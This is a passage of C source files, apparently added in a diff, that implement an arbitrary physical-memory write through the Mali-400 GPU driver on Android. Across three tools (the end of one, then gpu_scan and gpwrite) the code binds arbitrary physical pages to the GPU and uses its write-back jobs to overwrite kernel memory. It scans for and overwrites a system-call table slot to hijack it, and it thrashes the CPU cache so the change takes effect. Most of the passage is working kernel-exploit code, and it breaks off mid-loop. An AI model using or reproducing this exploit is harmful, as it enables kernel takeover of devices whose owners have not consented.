+    c[5] = 0xBC000000u;
+    c[6] = 0;
+    c[7] = 0;
+}
+
+/* Reverse the byte lane permutation the driver applies to the two constant
+ * registers so that `val` lands in memory as its own little-endian bytes. */
+static void encode_value(uint64_t val, uint32_t *c0, uint32_t *c1)
+{
+    unsigned char b[8];
+    memcpy(b, &val, 8);
+    *c0 = (uint32_t)b[4] | ((uint32_t)b[5] << 8) | ((uint32_t)b[2] << 16) |
+          ((uint32_t)b[3] << 24);
+    *c1 = (uint32_t)b[0] | ((uint32_t)b[1] << 8) | ((uint32_t)b[6] << 16) |
+          ((uint32_t)b[7] << 24);
+}
+
+static int bind_region(uint32_t vaddr, uint32_t size, uint32_t flags,
+                       uint32_t word0)
+{
+    struct mali_bind b;
+    memset(&b, 0, sizeof b);
+    b.vaddr = vaddr;
+    b.size = size;
+    b.flags = flags;
+    b.phys_addr = word0;
+    return ioctl(mali_fd, MALI_IOC_MEM_BIND, &b);
+}
+
+/* One write-back burst: 128 bytes of `val`, at GPU address `dest`. */
+static int gpu_submit(uint32_t dest, uint64_t val)
+{
+    uint32_t c0, c1;
+    encode_value(val, &c0, &c1);
+
+    static volatile uint32_t done;
+    uint8_t job[408];
+    memset(job, 0, sizeof job);
+    done = 0;
+
+    put64(job, 8, 0x7777);
+    put32(job, 20, CMD_VA);
+    put32(job, 24, CMD_VA + 0x1000);
+    put32(job, 32, 0x02);
+    put32(job, 44, c0);
+    put32(job, 48, c1);
+    put32(job, 52, c0);
+    put32(job, 56, c1);
+    put32(job, 68, CMD_VA + 0x2000);
+    put32(job, 72, (0x400u << 16) | 0x400u);
+    put32(job, 84, 1);
+    put32(job, 88, 1);
+    put32(job, 92, 0x77);
+    put32(job, 96, 1);
+    put32(job, 104, 0xE0C);
+    put32(job, 108, 0x8888);
+    put32(job, 168, 0x02);
+    put32(job, 172, dest);
+    put32(job, 176, PIXFMT_WB_128);
+    put32(job, 188, 0);
+    put32(job, 200, 0);
+    put32(job, 328, 1);
+    put32(job, 352, 0);
+    put32(job, 396, (uint32_t)-1);
+    put64(job, 400, (uint64_t)(uintptr_t)&done);
+
+    int sj = ioctl(mali_fd, MALI_IOC_PP_START_JOB, job);
+    printf("[*] start_job ret=%d errno=%d\n", sj, errno);
+    if (sj < 0)
+        return -1;
+
+    uint8_t notif[104];
+    memset(notif, 0, sizeof notif);
+    alarm(5);
+    printf("[*] waiting notif\n");
+    int r = ioctl(mali_fd, MALI_IOC_WAIT_NOTIF, notif);
+    printf("[*] wait_notif ret=%d errno=%d\n", r, errno);
+    alarm(0);
+    if (r < 0)
+        return -1;
+
+    size_t n = 2u << 20;
+    volatile char *p = malloc(n);
+    if (p) {
+        for (size_t i = 0; i < n; i += 64) p[i] = (char)(i * 7);
+        free((void *)p);
+    }
+    
+    usleep(150000);    return 0;
+}
+
+/* Bind a physical page at EXT_VA, then write 128 bytes at its page offset. */
+static int gpu_write128(uint32_t phys, uint64_t val)
+{
+    printf("[*] bind ext phys=0x%08x\n", phys & ~0xfffu);
+    if (bind_region(EXT_VA, 0x1000, BIND_EXTERNAL, phys & ~0xfffu) < 0) {
+        perror("bind ext");
+        return -1;
+    }
+    printf("[*] bound, submitting\n");
+    return gpu_submit(EXT_VA + (phys & 0xfffu), val);
+}
+
+/* Self-test on a private page, bound as a dma_buf: no ion_phys needed. */
+static int calibrate(void)
+{
+    struct ion_alloc a;
+    memset(&a, 0, sizeof a);
+    a.len = 0x1000;
+    a.align = 0x1000;
+    a.heap_mask = ION_HEAP_CARVEOUT;
+    if (ioctl(ion_fd, ION_IOC_ALLOC, &a) < 0) {
+        perror("ion carveout alloc");
+        return -1;
+    }
+    struct ion_fd f;
+    f.handle = a.handle;
+    f.fd = -1;
+    if (ioctl(ion_fd, ION_IOC_SHARE, &f) < 0) {
+        perror("ion share");
+        return -1;
+    }
+    uint8_t *pg = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, f.fd, 0);
+    if (pg == MAP_FAILED) {
+        perror("mmap carveout");
+        return -1;
+    }
+    if (bind_region(EXT_VA, 0x1000, 0x200 /* DMA_BUF */, (uint32_t)f.fd) < 0) {
+        perror("bind calib buffer");
+        return -1;
+    }
+
+    const uint32_t off = 0x800;
+    const uint64_t val = 0xa1b2c3d4e5f60718ULL;
+    printf("[*] calib bound, submitting\n");
+    memset(pg, 0xa5, 0x1000);
+    if (gpu_submit(EXT_VA + off, val) < 0) {
+        printf("[!] calibration write failed\n");
+        return -1;
+    }
+
+    int first = -1, last = -1, changed = 0;
+    for (uint32_t i = 0; i < 0x1000; i++) {
+        if (pg[i] != 0xa5) {
+            if (first < 0) first = (int)i;
+            last = (int)i;
+            changed++;
+        }
+    }
+    int ok = (first == (int)off) && (changed == 128);
+    for (int i = 0; i < 16 && ok; i++)
+        if (pg[off + i] != ((uint8_t *)&val)[i & 7]) ok = 0;
+
+    printf("[*] calibration: request 0x%03x -> changed [0x%03x..0x%03x], %d bytes  %s\n",
+           off, first, last, changed, ok ? "OK" : "FAILED");
+    munmap(pg, 0x1000);
+    return ok ? 0 : -1;
+}
+
+int main(int argc, char **argv)
+{
+    setvbuf(stdout, NULL, _IONBF, 0);
+    if (argc < 3) {
+        fprintf(stderr, "usage: %s <phys_hex> <value_hex64>\n", argv[0]);
+        return 1;
+    }
+    uint32_t phys = (uint32_t)strtoul(argv[1], NULL, 16);
+    uint64_t val = strtoull(argv[2], NULL, 16);
+
+    mali_fd = open("/dev/mali", O_RDWR);
+    ion_fd = open("/dev/ion", O_RDWR);
+    if (mali_fd < 0 || ion_fd < 0) {
+        perror("open /dev/mali or /dev/ion");
+        return 1;
+    }
+
+    /* Command buffer: ion system heap, mapped into the GPU at CMD_VA. */
+    struct ion_alloc a;
+    memset(&a, 0, sizeof a);
+    a.len = 0x4000;
+    a.align = 0x1000;
+    a.heap_mask = ION_HEAP_SYSTEM;
+    if (ioctl(ion_fd, ION_IOC_ALLOC, &a) < 0) {
+        perror("ion cmd alloc");
+        return 1;
+    }
+    struct ion_fd f;
+    f.handle = a.handle;
+    f.fd = -1;
+    if (ioctl(ion_fd, ION_IOC_SHARE, &f) < 0) {
+        perror("ion cmd share");
+        return 1;
+    }
+    cmd_buf = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, f.fd, 0);
+    if (cmd_buf == MAP_FAILED) {
+        perror("mmap cmd");
+        return 1;
+    }
+    if (bind_region(CMD_VA, 0x4000, 0x200 /* DMA_BUF */, (uint32_t)f.fd) < 0) {
+        perror("bind cmd buffer");
+        return 1;
+    }
+    build_shader();
+
+    if (calibrate() < 0) {
+        printf("[!] aborting without touching the requested address\n");
+        return 2;
+    }
+    printf("[*] calibration OK, exiting without writing target\n");
+    return 0;
+    if (0) {
+        fprintf(stderr, "[!] physical address must be page aligned\n");
+        return 1;
+    }
+
+    printf("[*] writing 128 bytes of 0x%016llx at phys 0x%08x\n",
+           (unsigned long long)val, phys);
+    if (gpu_write128(phys, val) < 0) {
+        perror("gpu write");
+        return 1;
+    }
+    printf("[*] done\n");
+    return 0;
+}
+
+
+
+```
+
+`src/gpu_scan.c`:
+
+```c
+/*
+ * gpu_scan - in-process probe loop for the Utgard arbitrary-physical-write
+ *            primitive.
+ *
+ * For every candidate physical address it
+ *   1. binds that page with the external-memory backend at EXT_VA,
+ *   2. submits one PP job writing a 128-byte canary (8-byte value x 16),
+ *   3. calls syscall(244) and checks whether the return value is still
+ *      -ENOSYS (slot untouched) or something else (we hit sys_call_table[244]).
+ *
+ * The canary is an address of a harmless kernel function; if the write lands
+ * in the syscall table, the slot execute it instead of sys_ni_syscall.
+ *
+ * Build (32-bit ARM, static):
+ *   zig cc -target arm-linux-musleabihf -O1 -static -o gpu_scan gpu_scan.c
+ *
+ * Usage:
+ *   gpu_scan bench <phys_hex> <count>
+ *   gpu_scan scan  <start_hex> <end_hex> <step_hex> <canary_hex>
+ */
+#define _GNU_SOURCE
+#include <errno.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
+#include <time.h>
+#include <unistd.h>
+
+#define ION_IOC_ALLOC 0xc0144900u
+#define ION_IOC_SHARE 0xc0084904u
+
+#define MALI_IOC_MEM_BIND 0xc0288302u
+#define MALI_IOC_PP_START_JOB 0xc1988400u
+#define MALI_IOC_WAIT_NOTIF 0xc0688202u
+
+#define CMD_VA 0x20000000u
+#define EXT_VA 0x40000000u
+#define ION_HEAP_SYSTEM 1u
+#define BIND_EXTERNAL (1u << 11)
+#define PIXFMT_WB_128 0x06
+
+struct ion_alloc { uint32_t len, align, heap_mask, flags, handle; };
+struct ion_fd { uint32_t handle; int32_t fd; };
+struct mali_bind {
+    uint64_t ctx;
+    uint32_t vaddr, size, flags, padding;
+    uint32_t phys_addr, rights, ext_flags, pad2;
+};
+
+static void put32(void *b, unsigned off, uint32_t v)
+{
+    *(uint32_t *)((char *)b + off) = v;
+}
+static void put64(void *b, unsigned off, uint64_t v)
+{
+    *(uint64_t *)((char *)b + off) = v;
+}
+
+static int mali_fd = -1, ion_fd = -1, cmd_fd = -1;
+static void *cmd_buf;
+
+static void build_shader(void)
+{
+    uint32_t *c = (uint32_t *)cmd_buf;
+    fprintf(stderr, "[.] cmd_buf=%p\n", cmd_buf); memset(cmd_buf, 0, 0x1000); fprintf(stderr, "[.] memset 4k ok\n");
+    c[0] = 0;
+    c[1] = 0xB8000000u;
+    c[2] = 0xE0000002u | (((CMD_VA + 0x3000u) >> 3) & ~0xE0000003u);
+    c[3] = 0xB0000000u;
+    c[4] = 0;
+    c[5] = 0xBC000000u;
+    c[6] = 0;
+    c[7] = 0;
+}
+
+static void encode_value(uint64_t val, uint32_t *c0, uint32_t *c1)
+{
+    unsigned char b[8];
+    memcpy(b, &val, 8);
+    *c0 = (uint32_t)b[4] | ((uint32_t)b[5] << 8) | ((uint32_t)b[2] << 16) |
+          ((uint32_t)b[3] << 24);
+    *c1 = (uint32_t)b[0] | ((uint32_t)b[1] << 8) | ((uint32_t)b[6] << 16) |
+          ((uint32_t)b[7] << 24);
+}
+
+static int bind_region(uint32_t vaddr, uint32_t size, uint32_t flags,
+                       uint32_t word0)
+{
+    struct mali_bind b;
+    memset(&b, 0, sizeof b);
+    b.vaddr = vaddr;
+    b.size = size;
+    b.flags = flags;
+    b.phys_addr = word0;
+    return ioctl(mali_fd, MALI_IOC_MEM_BIND, &b);
+}
+
+/* Open a session and map the command buffer into it. */
+static int session_open(void)
+{
+    fprintf(stderr, "[.] session_open\n");
+    if (mali_fd >= 0)
+        close(mali_fd);
+    mali_fd = open("/dev/mali", O_RDWR);
+    if (mali_fd < 0)
+        return -1;
+    fprintf(stderr, "[.] bind cmd buf\n");
+    if (bind_region(CMD_VA, 0x4000, 0x200 /* DMA_BUF */, (uint32_t)cmd_fd) < 0) {
+        close(mali_fd);
+        mali_fd = -1;
+        return -1;
+    }
+    fprintf(stderr, "[.] bind ret ok, build_shader\n");
+    build_shader();
+    fprintf(stderr, "[.] shader built\n");
+    return 0;
+}
+
+/* One 128-byte write-back burst of `val` at physical page `phys`. */
+static int gpu_submit(uint32_t dest, uint64_t val)
+{
+    uint32_t c0, c1;
+    encode_value(val, &c0, &c1);
+
+    static volatile uint32_t done;
+    uint8_t job[408];
+    memset(job, 0, sizeof job);
+    done = 0;
+
+    put64(job, 8, 0x7777);
+    put32(job, 20, CMD_VA);
+    put32(job, 24, CMD_VA + 0x1000);
+    put32(job, 32, 0x02);
+    put32(job, 44, c0);
+    put32(job, 48, c1);
+    put32(job, 52, c0);
+    put32(job, 56, c1);
+    put32(job, 68, CMD_VA + 0x2000);
+    put32(job, 72, (0x400u << 16) | 0x400u);
+    put32(job, 84, 1);
+    put32(job, 88, 1);
+    put32(job, 92, 0x77);
+    put32(job, 96, 1);
+    put32(job, 104, 0xE0C);
+    put32(job, 108, 0x8888);
+    put32(job, 168, 0x02);
+    put32(job, 172, dest);
+    put32(job, 176, PIXFMT_WB_128);
+    put32(job, 188, 0);
+    put32(job, 200, 0);
+    put32(job, 328, 1);
+    put32(job, 352, 0);
+    put32(job, 396, (uint32_t)-1);
+    put64(job, 400, (uint64_t)(uintptr_t)&done);
+
+    if (ioctl(mali_fd, MALI_IOC_PP_START_JOB, job) < 0)
+        return -1;
+
+    uint8_t notif[104];
+    memset(notif, 0, sizeof notif);
+    if (ioctl(mali_fd, MALI_IOC_WAIT_NOTIF, notif) < 0)
+        return -1;
+    return 0;
+}
+
+static double now_ms(void)
+{
+    struct timespec ts;
+    clock_gettime(CLOCK_MONOTONIC, &ts);
+    return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
+}
+
+/* Write 128 bytes of `val` at physical `phys`.  Returns 0, or -1 if the
+ * session had to be recreated (caller retries). */
+static int probe_write(uint32_t phys, uint64_t val)
+{
+    if (bind_region(EXT_VA, 0x1000, BIND_EXTERNAL, phys & ~0xfffu) < 0)
+        return -1;
+    if (gpu_submit(EXT_VA + (phys & 0xfffu), val) < 0)
+        return -1;
+    return 0;
+}
+
+static int setup_ion(void)
+{
+    ion_fd = open("/dev/ion", O_RDWR);
+    if (ion_fd < 0) { perror("open /dev/ion"); return -1; }
+
+    struct ion_alloc a;
+    memset(&a, 0, sizeof a);
+    a.len = 0x4000;
+    a.align = 0x1000;
+    a.heap_mask = ION_HEAP_SYSTEM;
+    if (ioctl(ion_fd, ION_IOC_ALLOC, &a) < 0) { perror("ion alloc"); return -1; }
+    fprintf(stderr, "[.] ion alloc ok\n");
+
+    struct ion_fd f;
+    f.handle = a.handle;
+    f.fd = -1;
+    if (ioctl(ion_fd, ION_IOC_SHARE, &f) < 0) { perror("ion share"); return -1; }
+    cmd_fd = f.fd;
+
+    fprintf(stderr, "[.] ion share ok fd=%d\n", cmd_fd);
+    cmd_buf = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, cmd_fd, 0);
+    if (cmd_buf == MAP_FAILED) { perror("mmap cmd"); return -1; }
+    return 0;
+}
+
+int main(int argc, char **argv)
+{
+    setvbuf(stdout, NULL, _IONBF, 0);
+    if (argc < 3) {
+        fprintf(stderr, "usage: %s bench <phys> <count>\n"
+                        "       %s scan <start> <end> <step> <canary>\n",
+                argv[0], argv[0]);
+        return 1;
+    }
+    if (setup_ion() < 0)
+        return 1;
+    if (session_open() < 0) { perror("mali session"); return 1; }
+
+    if (!strcmp(argv[1], "bench")) {
+        uint32_t phys = (uint32_t)strtoul(argv[2], NULL, 16);
+        int n = atoi(argv[3]);
+        uint64_t val = 0x1122334455667788ULL;
+        double t0 = now_ms();
+        for (int i = 0; i < n; i++) {
+            if (probe_write(phys, val) < 0) {
+                if (session_open() < 0) { printf("session reopen failed at %d\n", i); return 1; }
+                i--; continue;
+            }
+        }
+        double dt = now_ms() - t0;
+        printf("%d writes in %.1f ms = %.2f ms/write (%.0f writes/s)\n",
+               n, dt, dt / n, n * 1000.0 / dt);
+        return 0;
+    }
+
+    if (!strcmp(argv[1], "place")) {
+        /* Bind a page we own at an arbitrary *offset* inside it through the
+         * external-physical backend and report exactly what changed.  This is
+         * the end-to-end check of "does page+offset really land there". */
+        uint32_t off = (argc >= 3) ? (uint32_t)strtoul(argv[2], NULL, 16) : 0x7a0;
+        int fd = open("/data/local/tmp/place.bin", O_RDWR | O_CREAT, 0644);
+        if (fd < 0) { perror("open place.bin"); return 1; }
+        if (ftruncate(fd, 0x1000) < 0) { perror("ftruncate"); return 1; }
+        unsigned char *pg = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                                 MAP_SHARED, fd, 0);
+        if (pg == MAP_FAILED) { perror("mmap"); return 1; }
+        memset(pg, 0xAA, 0x1000);
+
+        int pm = open("/proc/self/pagemap", O_RDONLY);
+        if (pm < 0) { perror("pagemap"); return 1; }
+        uint64_t e = 0;
+        if (pread(pm, &e, 8, ((off_t)(uintptr_t)pg / 0x1000) * 8) != 8) {
+            perror("pread pagemap"); return 1;
+        }
+        uint64_t pfn = e & ((1ULL << 55) - 1);
+        uint32_t phys = (uint32_t)(pfn << 12);
+        printf("page phys=0x%x  writing at +0x%x (0x%x)\n", phys, off, phys + off);
+
+        const uint64_t val = 0x1122334455667788ULL;
+        if (probe_write(phys + off, val) < 0) {
+            if (session_open() < 0) { printf("session reopen failed\n"); return 1; }
+            if (probe_write(phys + off, val) < 0) { printf("write failed\n"); return 1; }
+        }
+
+        int first = -1, last = -1, changed = 0;
+        for (uint32_t i = 0; i < 0x1000; i++) {
+            if (pg[i] != 0xAA) {
+                if (first < 0) first = (int)i;
+                last = (int)i;
+                changed++;
+            }
+        }
+        printf("changed [0x%x..0x%x] count=%d  (asked 0x%x..0x%x)\n",
+               first, last, changed, off, (unsigned)(off + 127));
+        int ok = (first == (int)off) && (last == (int)off + 127) && (changed == 128);
+        printf("%s\n", ok ? "PLACEMENT OK" : "PLACEMENT MISMATCH");
+        return ok ? 0 : 2;
+    }
+
+    if (!strcmp(argv[1], "scan")) {
+        if (argc < 6) { fprintf(stderr, "scan needs start end step canary\n"); return 1; }
+        uint32_t cur = (uint32_t)strtoul(argv[2], NULL, 16);
+        uint32_t end = (uint32_t)strtoul(argv[3], NULL, 16);
+        uint32_t step = (uint32_t)strtoul(argv[4], NULL, 16);
+        uint64_t canary = strtoull(argv[5], NULL, 16);
+        long n = 0;
+        double t0 = now_ms();
+
+        while (cur < end) {
+            if (probe_write(cur, canary) < 0) {
+                if (session_open() < 0) {
+                    printf("FATAL session reopen failed at 0x%x\n", cur);
+                    return 1;
+                }
+                continue; /* retry the same address with a fresh session */
+            }
+
+            unsigned long r = (unsigned long)syscall(244, 0UL, 0UL, 0UL);
+            n++;
+            if (r != (unsigned long)-1) {
+                printf("\nHIT 0x%08x -> syscall(244) ret=0x%lx\n", cur, r);
+                return 0;
+            }
+            if ((n % 200) == 0) {
+                double dt = now_ms() - t0;
+                printf("... 0x%08x  %ld probes  %.1f ms/probe\n", cur, n, dt / n);
+            }
+            cur += step;
+        }
+        double dt = now_ms() - t0;
+        printf("DONE 0x%x probes=%ld %.1f ms/probe (no hit)\n",
+               end, n, dt / (n ? n : 1));
+        return 2;
+    }
+
+    fprintf(stderr, "unknown mode\n");
+    return 1;
+}
+
+
+
+
+```
+
+`src/gpwrite.c`:
+
+```c
+/*
+ * gpwrite - Utgard (Mali-400) arbitrary physical 128-byte write, ion-free.
+ *
+ * /dev/ion's mmap on this firmware returns a bogus address (0x400008) for
+ * every request, so the command buffer cannot be filled through ion.  Instead
+ * it lives in a plain file page we mmap ourselves; the physical address comes
+ * from /proc/self/pagemap and the page is attached to the GPU with the
+ * external-memory backend.  __ARM_NR_cacheflush makes the fresh contents
+ * visible to the GPU.
+ *
+ * Modes:
+ *   place <off>                         self-test on a page we own
+ *   write <phys> <val>                  one 128-byte write
+ *   probe <phys>                        write canary, report syscall(244)
+ *   scan <start> <end> <step> <canary>  find sys_call_table[244]
+ */
+#define _GNU_SOURCE
+#include <errno.h>
+#include <fcntl.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/syscall.h>
+#include <time.h>
+#include <unistd.h>
+
+/* Raw syscall: libc folds negative returns into -1/errno, which hides -ENOSYS.
+ * For the slot probe we need the real value.  aarch64 variant uses svc inline
+ * so the caller's bitness also selects the 64-bit sys_call_table (a 32-bit
+ * caller would go through compat_sys_call_table in .text instead). */
+static long raw_syscall1(long n, long a)
+{
+#if defined(__aarch64__)
+    register long x8 asm("x8") = n;
+    register long x0 asm("x0") = a;
+    asm volatile("svc #0" : "+r"(x0) : "r"(x8) : "memory");
+    return x0;
+#else
+    return syscall(n, a);
+#endif
+}
+
+#define MALI_IOC_MEM_BIND 0xc0288302u
+#define MALI_IOC_PP_START_JOB 0xc1988400u
+#define MALI_IOC_WAIT_NOTIF 0xc0688202u
+
+#define CMD_VA 0x20000000u
+#define EXT_VA 0x40000000u
+#define BIND_EXTERNAL (1u << 11)
+#define PIXFMT_WB_128 0x06
+#define ARM_NR_CACHEFLUSH 0x0f0002
+#define MAX_SLOTS 400
+
+struct mali_bind {
+    uint64_t ctx;
+    uint32_t vaddr, size, flags, padding;
+    uint32_t phys_addr, rights, ext_flags, pad2;
+};
+
+static void put32(void *b, unsigned off, uint32_t v)
+{
+    *(uint32_t *)((char *)b + off) = v;
+}
+static void put64(void *b, unsigned off, uint64_t v)
+{
+    *(uint64_t *)((char *)b + off) = v;
+}
+
+static int mali_fd = -1;
+static void *cmd_buf;
+static uint32_t cmd_phys[4];
+
+static int pagemap_phys(void *va, uint32_t *out)
+{
+    int pm = open("/proc/self/pagemap", O_RDONLY);
+    if (pm < 0) { perror("pagemap"); return -1; }
+    uint64_t e = 0;
+    off_t off = ((off_t)(uintptr_t)va / 0x1000) * 8;
+    ssize_t n = pread(pm, &e, 8, off);
+    close(pm);
+    if (n != 8) { perror("pread pagemap"); return -1; }
+    if (!(e >> 63)) { fprintf(stderr, "page not present\n"); return -1; }
+    *out = (uint32_t)((e & ((1ULL << 55) - 1)) << 12);
+    return 0;
+}
+
+static int bind_region(uint32_t vaddr, uint32_t size, uint32_t flags,
+                       uint32_t word0)
+{
+    struct mali_bind b;
+    memset(&b, 0, sizeof b);
+    b.vaddr = vaddr;
+    b.size = size;
+    b.flags = flags;
+    b.phys_addr = word0;
+    return ioctl(mali_fd, MALI_IOC_MEM_BIND, &b);
+}
+
+static void build_shader(void)
+{
+    uint32_t *c = (uint32_t *)cmd_buf;
+    c[0] = 0;
+    c[1] = 0xB8000000u;
+    c[2] = 0xE0000002u | (((CMD_VA + 0x3000u) >> 3) & ~0xE0000003u);
+    c[3] = 0xB0000000u;
+    c[4] = 0;
+    c[5] = 0xBC000000u;
+    c[6] = 0;
+    c[7] = 0;
+}
+
+static void encode_value(uint64_t val, uint32_t *c0, uint32_t *c1)
+{
+    unsigned char b[8];
+    memcpy(b, &val, 8);
+    *c0 = (uint32_t)b[4] | ((uint32_t)b[5] << 8) | ((uint32_t)b[2] << 16) |
+          ((uint32_t)b[3] << 24);
+    *c1 = (uint32_t)b[0] | ((uint32_t)b[1] << 8) | ((uint32_t)b[6] << 16) |
+          ((uint32_t)b[7] << 24);
+}
+
+static int setup_cmd(void)
+{
+    const char *path = "/data/local/tmp/cmdbuf.bin";
+    int fd = open(path, O_RDWR | O_CREAT, 0644);
+    if (fd < 0) { perror("open cmdbuf"); return -1; }
+    if (ftruncate(fd, 0x4000) < 0) { perror("ftruncate"); return -1; }
+
+    cmd_buf = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    if (cmd_buf == MAP_FAILED) { perror("mmap cmdbuf"); return -1; }
+    memset(cmd_buf, 0, 0x4000);
+
+    for (int i = 0; i < 4; i++) {
+        volatile unsigned char *pg = (volatile unsigned char *)cmd_buf + i * 0x1000;
+        *pg = 0;
+        if (pagemap_phys((void *)pg, &cmd_phys[i]) < 0)
+            return -1;
+    }
+
+    mali_fd = open("/dev/mali", O_RDWR);
+    if (mali_fd < 0) { perror("open /dev/mali"); return -1; }
+
+    for (int i = 0; i < 4; i++)
+        if (bind_region(CMD_VA + i * 0x1000, 0x1000, BIND_EXTERNAL,
+                        cmd_phys[i]) < 0) {
+            perror("bind cmd page");
+            return -1;
+        }
+
+    build_shader();
+    syscall(ARM_NR_CACHEFLUSH, (unsigned long)cmd_buf,
+            (unsigned long)cmd_buf + 0x4000, 0);
+    return 0;
+}
+
+static int gpu_submit(uint32_t dest, uint64_t val)
+{
+    uint32_t c0, c1;
+    encode_value(val, &c0, &c1);
+
+    static volatile uint32_t done;
+    uint8_t job[408];
+    memset(job, 0, sizeof job);
+    done = 0;
+
+    put64(job, 8, 0x7777);
+    put32(job, 20, CMD_VA);
+    put32(job, 24, CMD_VA + 0x1000);
+    put32(job, 32, 0x02);
+    put32(job, 44, c0);
+    put32(job, 48, c1);
+    put32(job, 52, c0);
+    put32(job, 56, c1);
+    put32(job, 68, CMD_VA + 0x2000);
+    put32(job, 72, (0x400u << 16) | 0x400u);
+    put32(job, 84, 1);
+    put32(job, 88, 1);
+    put32(job, 92, 0x77);
+    put32(job, 96, 1);
+    put32(job, 104, 0xE0C);
+    put32(job, 108, 0x8888);
+    put32(job, 168, 0x02);
+    put32(job, 172, dest);
+    put32(job, 176, PIXFMT_WB_128);
+    put32(job, 188, 0);
+    put32(job, 200, 0);
+    put32(job, 328, 1);
+    put32(job, 352, 0);
+    put32(job, 396, (uint32_t)-1);
+    put64(job, 400, (uint64_t)(uintptr_t)&done);
+
+    if (ioctl(mali_fd, MALI_IOC_PP_START_JOB, job) < 0)
+        return -1;
+    uint8_t notif[104];
+    memset(notif, 0, sizeof notif);
+    if (ioctl(mali_fd, MALI_IOC_WAIT_NOTIF, notif) < 0)
+        return -1;
+    usleep(20000);
+    return 0;
+}
+
+/* Write 128 bytes of `val` at `phys`; each call needs its own GPU VA slot. */
+static int write128(uint32_t phys, uint64_t val, int slot)
+{
+    uint32_t va = EXT_VA + (uint32_t)slot * 0x1000;
+    if (bind_region(va, 0x1000, BIND_EXTERNAL, phys & ~0xfffu) < 0)
+        return -1;
+    /* The PP job occasionally completes without emitting the burst (seen as
+     * "nothing changed" on a page we own), so submit a few times. */
+    for (int i = 0; i < 3; i++)
+        if (gpu_submit(va + (phys & 0xfffu), val) < 0)
+            return -1;
+    return 0;
+}
+
+/* Flush the CPU caches: sys_call_table is read on every syscall, so its cache
+ * line is hot and a GPU (DMA) write to it is invisible until the line is
+ * evicted.  Walking a buffer several MB wide forces that eviction. */
+static void cache_thrash(void)
+{
+    static unsigned char *buf;
+    const size_t len = 8u << 20;
+    if (!buf) {
+        buf = mmap(NULL, len, PROT_READ | PROT_WRITE,
+                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+        if (buf == MAP_FAILED) { buf = NULL; return; }
+        memset(buf, 1, len);
+    }
+    for (size_t i = 0; i < len; i += 64)
+        buf[i] ^= 0x5a;
+}
+
+static double now_ms(void)
+{
+    struct timespec ts;
+    clock_gettime(CLOCK_MONOTONIC, &ts);
+    return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
+}
+
+int main(int argc, char **argv)
+{
+    setvbuf(stdout, NULL, _IONBF, 0);
+    if (argc < 3) {
+        fprintf(stderr,
+                "usage: %s place <off> | write <phys> <val> | "
+                "probe <phys> | scan <start> <end> <step> <canary>\n", argv[0]);
+        return 1;
+    }
+    if (setup_cmd() < 0)
+        return 1;
+
+    if (!strcmp(argv[1], "place")) {
+        uint32_t off = (uint32_t)strtoul(argv[2], NULL, 16);
+        int fd = open("/data/local/tmp/place.bin", O_RDWR | O_CREAT, 0644);
+        if (fd < 0) { perror("open place"); return 1; }
+        if (ftruncate(fd, 0x1000) < 0) { perror("ftruncate place"); return 1; }
+        unsigned char *pg = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
+                                 MAP_SHARED, fd, 0);
+        if (pg == MAP_FAILED) { perror("mmap place"); return 1; }
+        memset(pg, 0xAA, 0x1000);
+        uint32_t phys;
+        if (pagemap_phys(pg, &phys) < 0) return 1;
+        printf("[*] test page phys=0x%x +0x%x\n", phys, off);
+        if (write128(phys + off, 0x1122334455667788ULL, 0) < 0) {
+            printf("[!] write failed\n"); return 1;
+        }
+        int first = -1, last = -1, changed = 0;
+        for (uint32_t i = 0; i < 0x1000; i++)
+            if (pg[i] != 0xAA) {
+                if (first < 0) first = (int)i;
+                last = (int)i; changed++;
+            }
+        int ok = (first == (int)off) && (last == (int)off + 127) && (changed == 128);
+        printf("[*] changed [0x%x..0x%x] count=%d %s\n", first, last, changed,
+               ok ? "PLACEMENT OK" : "MISMATCH");
+        return ok ? 0 : 2;
+    }
+
+    if (!strcmp(argv[1], "write")) {
+        if (argc < 4) { fprintf(stderr, "write <phys> <val>\n"); return 1; }
+        uint32_t phys = (uint32_t)strtoul(argv[2], NULL, 16);
+        uint64_t val = strtoull(argv[3], NULL, 16);
+        if (write128(phys, val, 0) < 0) { printf("[!] write failed\n"); return 1; }
+        printf("[*] wrote 0x%016llx at 0x%x\n", (unsigned long long)val, phys);
+        return 0;
+    }
+
+    if (!strcmp(argv[1], "probe")) {
+        uint32_t phys = (uint32_t)strtoul(argv[2], NULL, 16);
+        for (int t = 0; t < 3; t++) {
+            if (write128(phys, 0xffffffc0019e643cULL, 0) < 0)
+                continue;
+            cache_thrash();
+            unsigned long r = (unsigned long)raw_syscall1(244, 0);
+            printf("[*] try %d: syscall(244) = 0x%lx\n", t, r);
+            if (r != (unsigned long)-38) /* -ENOSYS: slot still sys_ni_syscall */
+                return 0;
+        }
+        return 2;
+    }
+
+    if (!strcmp(argv[1], "scan")) {
+        if (argc < 6) { fprintf(stderr, "scan needs start end step canary\n"); return 1; }
+        uint32_t cur = (uint32_t)strtoul(argv[2], NULL, 16);
+        uint32_t end = (uint32_t)strtoul(argv[3], NULL, 16);
+        uint32_t step = (uint32_t)strtoul(argv[4], NULL, 16);
+        uint64_t canary = strtoull(argv[5], NULL, 16);
+        /* Which table slot to hit: sys_call_table[nr] sits at page + nr*8.
+         * Default 244 (mainline 3.14); this firmware needs 42 (nfsservctl). */
+        uint32_t slot_off = (argc >= 7) ? (uint32_t)strtoul(argv[6], NULL, 16) : 0x7a0u;
+        long n = 0;
+        double t0 = now_ms();
+        int slot = 0;
+
+        printf("scan 0x%x..0x%x slot_off=0x%x\n", cur, end, slot_off);
+        while (cur < end) {
+            if (slot >= MAX_SLOTS) {
+                printf("[!] out of VA slots at 0x%x (probes=%ld)\n", cur, n);
+                return 1;
